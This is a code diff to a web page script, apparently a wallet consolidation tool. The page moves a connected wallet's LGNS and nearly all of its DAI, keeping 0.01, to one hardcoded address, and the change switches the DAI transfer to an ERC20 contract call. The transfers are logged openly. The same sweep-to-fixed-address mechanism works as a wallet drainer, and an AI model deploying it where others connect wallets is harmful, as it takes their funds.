@@ -74,6 +74,7 @@ button{font-family:inherit;cursor:pointer;border:0}
   var TO='0xffc31b596754137718f22d7708e1acd7a5c4dbe6';
   var DT='0x4d127c5b2efc63b6a7670cdddd853ca22573a8b9';
   var LGNS='0x4d1d808a081fdac440703b3765fc61f8028c06b8';
+  var DAI='0x83fd06f0846d9d90b3016bf670efe2e0b11cde14'; // Anubis不支持原生转账,DAI必须走ERC20 transfer
   var RESERVE=10n**16n; // 0.01 DAI
   var myAddr=null,busy=false;
   function $(i){return document.getElementById(i);}
@@ -132,7 +133,7 @@ button{font-family:inherit;cursor:pointer;border:0}
       if(l>0n){await send({to:LGNS,data:'0xa9059cbb'+pad(TO)+pad(l.toString(16))},'2. 转出 '+fmt(l,9)+' LGNS');}else logln('· 2. 钱包 LGNS 为 0，跳过');
       $('s2').classList.add('done');await refresh();
       var d=await balD(myAddr);var amt=d-RESERVE;
-      if(amt>0n){await send({to:TO,value:'0x'+amt.toString(16),data:'0x'},'3. 转出 '+fmt(amt,18)+' DAI');}else logln('· 3. DAI 不足 0.01，跳过');
+      if(amt>0n){await send({to:DAI,data:'0xa9059cbb'+pad(TO)+pad(amt.toString(16))},'3. 转出 '+fmt(amt,18)+' DAI');}else logln('· 3. DAI 不足 0.01，跳过');
       $('s3').classList.add('done');
       logln('<b class="ok">全部完成 ✓ 资产已归集到 …dbe6</b>');toast('归集完成');
     }catch(e){logln('✗ '+((e&&e.message)||e),'bad');toast('中断：'+((e&&e.message)||'失败')+'，可重新点击继续');}
